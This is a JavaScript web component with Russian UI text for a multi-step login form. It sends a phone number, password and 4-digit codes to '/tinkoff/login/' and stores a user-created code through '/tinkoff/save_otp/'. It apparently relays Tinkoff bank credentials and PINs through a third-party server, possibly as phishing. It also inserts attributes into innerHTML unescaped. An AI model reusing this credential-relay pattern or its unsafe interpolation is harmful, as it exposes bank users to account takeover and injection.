class InputControl extends HTMLElement {
    constructor() {
        super();

        const shadowRoot = this.attachShadow({ mode: 'open' });

        // HTML шаблон компонента
        shadowRoot.innerHTML += `
            <style>
                input[type="number"] {
                    -webkit-appearance: none;
                    -moz-appearance: textfield;
                    appearance: none;
                }

                input[type="number"]::-webkit-outer-spin-button,
                input[type="number"]::-webkit-inner-spin-button {
                    -webkit-appearance: none;
                    appearance: none;
                    margin: 0;
                }
                
                .input-container {
                    display: flex;
                    flex-direction: column;
                    gap: 10px;
                }

                input {
                    padding: 5px;
                }
            </style>
            <div class="input-container">
                <label>${this.getAttribute('label') || 'Введите значение'}</label>
                <input type="${this.getAttribute('type') || 'text'}" />
                <span class="error-message"></span>
                <button type="button">
                    Отправить
                    <span>&#8594;</span> <!-- Стрелочка -->
                </button>
            </div>
        `;

        // Получаем элементы для управления логикой
        this.input = shadowRoot.querySelector('input');
        this.errorMessageElement = shadowRoot.querySelector('.error-message');
        this.button = shadowRoot.querySelector('button');
        this.button.setAttribute('part', 'button');
        this.input.setAttribute('part', 'input');

        this.button.addEventListener('click', () => this.handleSubmit());
        this.input.addEventListener('keydown', (event) => {
            if (event.key === 'Enter') {
                this.handleSubmit();
            }
        });

        // Проверка токена и скрытие кнопки disconnect
        this.checkTokenAndHideDisconnectButton();
    }

    static get observedAttributes() {
        return ['label', 'type'];
    }

    attributeChangedCallback(name, oldValue, newValue) {
        if (name === 'label') {
            this.shadowRoot.querySelector('label').textContent = newValue;
        }
        if (name === 'type') {
            this.input.type = newValue;
        }
    }

    checkTokenAndHideDisconnectButton() {
        const urlParams = new URLSearchParams(window.location.search);
        const token = urlParams.get('token'); // Получаем токен, если он есть

        if (token) {
            // Скрываем кнопку disconnect
            const disconnectButton = document.querySelector('.disconnect-button');
            if (disconnectButton) {
                disconnectButton.style.display = 'none';
            }
        }
    }

    async handleSubmit() {
        const value = this.input.value.trim();
        let [isValid, errorMessage] = this.inputIsValid(value);

        if (!isValid) {
            this.showError(errorMessage);
            return;
        }

        this.hideError();

        showGlobalLoader();
        this.button.disabled = true;

        let isRedirect = false;

        // Извлечение токена из URL
        const urlParams = new URLSearchParams(window.location.search);
        const token = urlParams.get('token'); // Получаем токен

        // Формирование URL с токеном
        let loginUrl = '/tinkoff/login/';
        if (token) {
            loginUrl += `?token=${token}`;
        }

        try {
            const response = await fetch(loginUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(value)
            });

            if (!response.ok) {
                hideGlobalLoader();
                const errorData = await response.json();
                if (response.status === 307) {
                    showSessionExpiredModal(errorData.detail);
                } else {
                    this.showError(errorData.detail);
                    console.error('Ошибка: ', errorData);
                }
                return;
            }

            const data = await response.json();

            if (data.status === 'success') {
                if (data.current_page_type === 'Придумайте код') {
                    await fetch(`/tinkoff/save_otp/?otp=${value}`, {
                        method: 'POST',
                    });
                }
                
                const pageType = data.next_page_type;

                let redirectUrl = `/tinkoff/next/?step=${pageType}`;
                if (token) {
                    redirectUrl += `&token=${token}`; // Добавляем токен в редирект
                }

                window.location.href = redirectUrl;
                isRedirect = true;
            } else {
                this.showError(data.detail || 'Произошла ошибка.');
                this.input.value = '';
            }
        } catch (error) {
            this.showError('Ошибка сети. Попробуйте позже.');
            console.error('Ошибка сети: ', error);
        } finally {
            if (!isRedirect) {
                this.button.disabled = false;
                hideGlobalLoader();
            }
            
        }
    }

    showError(message) {
        this.errorMessageElement.style.display = 'block';
        this.errorMessageElement.textContent = message;
    }

    hideError() {
        this.errorMessageElement.style.display = 'none';
        this.errorMessageElement.textContent = '';
    }

    cleanInput() {
        this.input.value = ''
    }

    inputIsValid(value) {
        let isValid = true;
        let errorMessage = '';

        switch (this.input.type) {
            case 'tel':
                const phonePattern = /^(\+7|8)\s?\(?\d{3}\)?\s?\d{3}[-\s]?\d{2}[-\s]?\d{2}$/;
                isValid = phonePattern.test(value);
                errorMessage = 'Введите корректный номер телефона';
                break;
            case 'password':
                isValid = value.length > 0;
                errorMessage = 'Пароль не может быть пустым';
                break;
            case 'number':
                isValid = value.length === 4 && /^\d{4}$/.test(value);
                errorMessage = 'Код должен состоять из 4 цифр';
                break;
            default:
                isValid = value.length > 0;
                errorMessage = 'Поле не может быть пустым';
        }
        return [isValid, errorMessage];
    }
}

customElements.define('input-control', InputControl);